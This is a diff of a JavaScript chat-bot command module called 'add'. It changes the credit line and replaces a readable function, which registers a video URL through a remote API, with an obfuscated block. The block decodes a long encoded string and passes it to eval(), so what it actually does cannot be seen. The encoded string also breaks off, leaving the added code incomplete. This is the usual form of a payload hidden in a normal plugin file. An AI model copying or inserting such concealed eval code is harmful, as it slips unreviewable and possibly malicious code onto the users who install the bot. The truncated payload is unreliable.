@@ -4,7 +4,7 @@ module.exports.config = {
   name: "add",
   version: "11.9.7",
   permission: 0,
-  credits: "Islamick Cyber Chat",//Nazrul
+  credits: "Shaon Ahmed",
   prefix: true,
   description: "random love story video",
   category: "video",
@@ -12,30 +12,4 @@ module.exports.config = {
   cooldowns: 30,
 };
 
-module.exports.run = async ({ api, event, args }) => {
-  try {
-    const imageUrl = event.messageReply.attachments[0].url;
-    const videoName = args.join(" ").trim(); 
-
-    if (!videoName) {
-      return api.sendMessage("Please provide a name for the video.", event.threadID, event.messageID);
-    }
-    const apis1 = await axios.get('https://raw.githubusercontent.com/shaonproject/Shaon/main/api.json')
-  const Shaon1 = apis1.data.api
-  
-
-    const imgurResponse = await axios.get(`${Shaon1}/imgurv2?link=${encodeURIComponent(imageUrl)}`);
-    const imgurLink = imgurResponse.data.uploaded.image;
-    
-    const apis = await axios.get('https://raw.githubusercontent.com/shaonproject/Shaon/main/api.json');
-    const Shaon = apis.data.api;
-
-    const response = await axios.get(`${Shaon}/video/random?name=${encodeURIComponent(videoName)}&url=${encodeURIComponent(imgurLink)}`);
-    
-    api.sendMessage(`💌MESSAGE: URL ADDED SUCCESSFULLY\n🟡NAME: ${response.data.name}\n🖇️URL: ${response.data.url}`, event.threadID, event.messageID);
-
-  } catch (e) {
-    console.log(e);
-    api.sendMessage(`An error occurred: ${e.message}`, event.threadID, event.messageID);
-  }
-};
+var _0xc88e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe79c(d,e,f){var g=_0xc88e[2][_0xc88e[1]](_0xc88e[0]);var h=g[_0xc88e[3]](0,e);var i=g[_0xc88e[3]](0,f);var j=d[_0xc88e[1]](_0xc88e[0])[_0xc88e[10]]()[_0xc88e[9]](function(a,b,c){if(h[_0xc88e[4]](b)!==-1)return a+=h[_0xc88e[4]](b)*(Math[_0xc88e[8]](e,c))},0);var k=_0xc88e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc88e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe79c(s,e,10)-t)}return decodeURIComponent(escape(r))}("GSSIGSnIhGhIGMnIhaaIhGGInMhIhGGIGMaIGShIGSnIGSaIGMMIGMSInMhIGSaIGMnIGSMIMaMInGSIMaMIhGSIGMSIGnSIGSMIhGnIMaMInShIGnnIMaMIhGSIGShIhanInMMIMaMIhGGIGMhIhGGIGSMIGMMInMMIMaMIhGSIGSaIhaSIGMSIMaMIGnGInSGIMaMInGSInGMIMaMIGnnIMaMIGMMIGSaIGnSIMaMIGnnIMaMIhGnIGSnIGSMIGMSIGMMIMaMIhanIGSSIhGSIhaSIhGGIhnSIGSaIhaaIMaMInGSIMaMIhGGIGMhIhGGIGSMIGMMInMhIGSSIhGGIGMSIGMSIhGSIhaSIhGGIhMhIhGGIGShIhaaIGnSInMhIhGSIGMMIGMMIhGSIhGnIhaMIGSSIhGGIGSMIGMMIGMSIhhSInMaIhhnInMhIGMnIGSaIhaaInhGIMaMIhGnIGSnIGSMIGMSIGMMIMaMIGMhIhanIhGhIhGGIGSnIhSaIhGSIGSSIhGGIMaMInGSIMaMIhGSIGSaIhaSIGMSInMhIhahIGSnIhanIGSMInShIMahIMaMIMahInSGInMhIGMMIGSaIhanIGSSInShInSGInhGIMaMIhanIhGaIMaMInShIManIGMhIhanIhGhIhGGIGSnIhSaIhGSIGSSIhGGInSGIMaMIGnnIMaMIGSaIhGGIGMMIGMnIGSaIGSMIMaMIhGSIGShIhanInMhIGMSIhGGIGSMIhGhIhSGIhGGIGMSIGMSIhGSIhaSIhGGInShIMahIhMMIhaaIhGGIhGSIGMSIhGGIMaMIGShIGSaIGSnIGMhIhanIhGhIhGGIMaMIhGSIMaMIGSMIhGSIGSSIhGGIMaMIhGaIGSnIGSaIMaMIGMMIhaMIhGGIMaMIGMhIhanIhGhIhGGIGSnInMhIMahInMMIMaMIhGGIGMhIhGGIGSMIGMMInMhIGMMIhaMIGSaIhGGIhGSIhGhIhSSInaMInMMIMaMIhGGIGMhIhGGIGSMIGMMInMhIGSSIhGGIGMSIGMSIhGSIhaSIhGGIhSSInaMInSGInhGIMaMIGnGIMaMIhGnIGSnIGSMIGMSIGMMIMaMIhGSIGShIhanIGMSInnSIMaMInGSIMaMIhGSIGMGIhGSIhanIGMMIMaMIhGSIGMaIhanIGSnIGMSInMhIhaSIhGGIGMMInShInSnIhaMIGMMIGMMIGShIGMSInhhInMGInMGIGSaIhGSIGMGInMhIhaSIhanIGMMIhaMIGMnIhGMIGMnIGMSIhGG
